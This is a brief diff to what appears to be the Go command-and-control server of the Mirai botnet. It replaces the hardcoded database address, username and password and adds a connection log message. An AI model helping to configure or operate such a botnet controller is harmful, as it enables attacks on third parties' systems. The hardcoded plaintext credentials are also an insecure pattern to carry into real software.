@@ -7,9 +7,9 @@ import (
     "time"
 )
 
-const DatabaseAddr string   = "127.0.0.1"
-const DatabaseUser string   = "root"
-const DatabasePass string   = "password"
+const DatabaseAddr string   = "10.5.0.4"
+const DatabaseUser string   = "shift"
+const DatabasePass string   = "pwd"
 const DatabaseTable string  = "mirai"
 
 var clientList *ClientList = NewClientList()
@@ -43,6 +43,7 @@ func main() {
         if err != nil {
             break
         }
+        fmt.Println("Conn accepted")
         go initialHandler(conn)
     }
 
